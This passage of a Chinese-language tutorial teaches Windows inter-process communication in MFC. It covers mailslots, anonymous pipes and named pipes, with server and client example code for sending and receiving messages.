class="built_in">WriteFile</span>(hMailSlot, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//MessageBox(_T(&quot;写入数据失败&quot;));//若使用UNIDCODE字符集</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;写入数据失败&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hMailSlot);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hMailSlot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h3 id="8-6-进程间通信方式之匿名管道"><a href="#8-6-进程间通信方式之匿名管道" class="headerlink" title="8.6 进程间通信方式之匿名管道"></a>8.6 进程间通信方式之匿名管道</h3><p>匿名管道是一个没有命名的单向管道，本质上就是一个共享的内存区域。</p><p>需要注意的是：</p><ul><li>通常用来在父进程和子进程之间通信；</li><li>只能实现本地两个进程之间的通信；</li><li>不能实现网络通信。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建匿名管道，本质上创建了两个单向管道</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHANDLE hReadPipe,  <span class="comment">//该变量接收管道的读取句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ PHANDLE hWritePipe,<span class="comment">// 该变量接收管道的写句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,<span class="comment">//NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD nSize  <span class="comment">//管道缓冲区的大小 0:默认缓冲区大小</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>示例：</strong>【基于上一节的客户端服务端，服务端新增3个按钮，客户端新增两个按钮】在服务端可创建子进程【即客户端】，然后创建匿名管道。任意端点击发送，另一端接收。</p><p><img src="./8-3.png"></p><p>📋服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hReadPipe;</span><br><span class="line">HANDLE hWritePipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedCreateProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="comment">//创建匿名管道</span></span><br><span class="line">    SECURITY_ATTRIBUTES sa;</span><br><span class="line">    sa.bInheritHandle = TRUE;</span><br><span class="line">    sa.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line">    sa.nLength = <span class="built_in">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CreatePipe</span>(&amp;hReadPipe, &amp;hWritePipe, &amp;sa, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//MessageBox(_T(&quot;匿名管道创建失败&quot;));</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;匿名管道创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建子进程</span></span><br><span class="line">    STARTUPINFO strStartupInfo; <span class="comment">//用来指定新进程窗口如何显示【扩展属性】</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;strStartupInfo, <span class="number">0</span>, <span class="built_in">sizeof</span>(strStartupInfo));</span><br><span class="line">    strStartupInfo.cb = <span class="built_in">sizeof</span>(strStartupInfo);</span><br><span class="line">    strStartupInfo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">    strStartupInfo.hStdInput = hReadPipe;<span class="comment">//用于接收数据的管道</span></span><br><span class="line">    strStartupInfo.hStdOutput = hWritePipe;<span class="comment">//用于发送数据的管道</span></span><br><span class="line">    strStartupInfo.hStdError = <span class="built_in">GetStdHandle</span>(STD_ERROR_HANDLE);</span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION szProcessInformation;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;szProcessInformation, <span class="number">0</span>, <span class="built_in">sizeof</span>(szProcessInformation));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> iRet = <span class="built_in">CreateProcess</span>(</span><br><span class="line">        <span class="comment">//_T(&quot;MailSlotClient.exe&quot;),//指定要执行的模块的完整路径和文件名</span></span><br><span class="line">        <span class="string">&quot;MFCApp_mailslot_client.exe&quot;</span>,<span class="comment">//此处指向客上一节的客户端</span></span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        TRUE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;strStartupInfo, <span class="comment">//设置扩展属性</span></span><br><span class="line">        &amp;szProcessInformation<span class="comment">//接收有关新进程的标识信息</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (iRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//创建成功</span></span><br><span class="line">        <span class="built_in">CloseHandle</span>(szProcessInformation.hProcess);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(szProcessInformation.hThread);</span><br><span class="line">        szProcessInformation.dwProcessId = <span class="number">0</span>;</span><br><span class="line">        szProcessInformation.dwThreadId = <span class="number">0</span>;</span><br><span class="line">        szProcessInformation.hThread = <span class="literal">NULL</span>;</span><br><span class="line">        szProcessInformation.hProcess = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">        hReadPipe = <span class="literal">NULL</span>;</span><br><span class="line">        hWritePipe = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//MessageBox(_T(&quot;创建子进程失败&quot;));</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;创建子进程失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedRecv2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 接收</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwRead;<span class="comment">//实际读到的长度</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;Begin Read:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//此处修改两个项目【server|client】为多字节项目，否则不支持直接的字符串</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;Read Failed!&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 显示数据</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;############## dwRead = %d ########\n&quot;</span>, dwRead);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">    <span class="comment">//CloseHandle(hReadPipe);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedSend2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 发送</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="string">&quot;Unnamed Pipe coming from server&quot;</span> &#125;;</span><br><span class="line">    DWORD dwWrite;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hWritePipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//MessageBox(_T(&quot;写入数据失败&quot;));//若使用UNIDCODE字符集</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;写入数据失败&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>📋客户端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hReadPipe;</span><br><span class="line">HANDLE hWritePipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotclientDlg::OnBnClickedSendBtn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 发送：写入数据</span></span><br><span class="line">    hWritePipe = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="string">&quot;Unnamed Pipe coming from client&quot;</span> &#125;;</span><br><span class="line">    DWORD dwWrite;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hWritePipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//MessageBox(_T(&quot;写入数据失败&quot;));//若使用UNIDCODE字符集</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;写入数据失败&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//CloseHandle(hWritePipe);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotclientDlg::OnBnClickedRecvBtn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 接收</span></span><br><span class="line">    hReadPipe = <span class="built_in">GetStdHandle</span>(STD_INPUT_HANDLE);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwRead;<span class="comment">//实际读到的长度</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;Begin Read:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hReadPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;Read Failed!&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 显示数据</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;############## dwRead = %d ########\n&quot;</span>, dwRead);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><br><h3 id="8-7-进程间通信方式之命名管道"><a href="#8-7-进程间通信方式之命名管道" class="headerlink" title="8.7 进程间通信方式之命名管道"></a>8.7 进程间通信方式之命名管道</h3><p>与 <code>Socket</code> 相似，支持网络之间不同进程的通信，用于双向通信。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建命名管道</span></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateNamedPipeA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCSTR      lpName,  <span class="comment">//唯一的管道名称。 此字符串必须具有以下形式：\\.\pipe\pipename</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD       dwOpenMode,     <span class="comment">//打开模式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD       dwPipeMode,     <span class="comment">//管道模式</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD       nMaxInstances, <span class="comment">//可为此管道创建的最大实例数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD       nOutBufferSize,<span class="comment">//要为输出缓冲区保留的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD       nInBufferSize, <span class="comment">//要为输入缓冲区保留的字节数</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD       nDefaultTimeOut,<span class="comment">//超时处理</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpSecurityAttributes <span class="comment">//安全属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要等待连接</span></span><br><span class="line"><span class="function">BOOL <span class="title">ConnectNamedPipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE       hNamedPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端尝试连接命名管道</span></span><br><span class="line"><span class="built_in">WaitNamedPipe</span>(szNamedPipeName, NMPWAIT_WAIT_FOREVER);</span><br></pre></td></tr></table></figure><p><strong>示例：</strong>【基于匿名管道的客户端服务端，服务端新增3个按钮，客户端新增3个按钮】在服务端可创建命名管道并等待客户端连接，然后在客户端连接匿名管道。只要不关闭命名管道，可在任意端点击发送，另一端接收。</p><p><img src="./8-4.png"></p><p>📋服务端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hNamedPipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedCreateNamePipe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="comment">//1 创建一个命名管道</span></span><br><span class="line">    LPCTSTR szPipeName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\pipe\\mypipe&quot;</span>);</span><br><span class="line">    hNamedPipe = <span class="built_in">CreateNamedPipe</span>(szPipeName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,</span><br><span class="line">        PIPE_TYPE_BYTE, <span class="number">1</span>, <span class="number">1024</span>, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// NMPWAIT_USE_DEFAULT_WAIT = 0 // 默认超时处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hNamedPipe == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TRACE</span>(<span class="string">&quot;CreateNamedhPipe failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="comment">//MessageBox(_T(&quot;创建命名管道失败&quot;));</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;创建命名管道失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2 等待客户端的连接</span></span><br><span class="line">    HANDLE hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == hEvent)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;创建事件失败&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">        hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待hEvent事件，阻塞等待客户端连接</span></span><br><span class="line">    OVERLAPPED ovlap;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;ovlap, <span class="built_in">sizeof</span>(OVERLAPPED));</span><br><span class="line">    ovlap.hEvent = hEvent;</span><br><span class="line">    <span class="comment">//等待连接</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ConnectNamedPipe</span>(hNamedPipe, &amp;ovlap))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ERROR_IO_PENDING != <span class="built_in">GetLastError</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">MessageBox</span>(<span class="string">&quot;等待客户端连接失败&quot;</span>);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">            <span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">            hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">            hEvent = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE) == WAIT_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;等待对象失败&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">        hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">        hEvent = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="string">&quot;连接成功&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedSendName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 	命名管道发送</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="string">&quot;Named Pipe coming from Server&quot;</span> &#125;;</span><br><span class="line">    DWORD dwWrite;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hNamedPipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;写入数据失败&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hWritePipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotserverDlg::OnBnClickedRecvName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 命名管道接收</span></span><br><span class="line">    <span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwRead;<span class="comment">//实际读到的长度</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;Begin Read:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hNamedPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;Read Failed!&quot;</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hReadPipe);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//3 显示数据</span></span><br><span class="line">    <span class="built_in">TRACE</span>(<span class="string">&quot;############## dwRead = %d ########\n&quot;</span>, dwRead);</span><br><span class="line">    <span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>📋客户端</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hNamedPipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCAppmailslotclientDlg::OnBnClickedConnectPipe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    LPCTSTR szNamedPipeName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\pipe\\mypipe&quot;</span>);</span><br><span class="line">    <span class="comment">//等待是否有可用的命名管道</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">WaitNamedPipe</span>(szNamedPipeName, NMPWAIT_WAIT_FOREVER))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">&quot;当前没有可以利用的管道&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    hNamedPipe = <span class="built_in">CreateFile</span>(szNamedPipeName, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hNamedPipe == INVALID_HANDLE_VALUE)</span><br><span class="line">    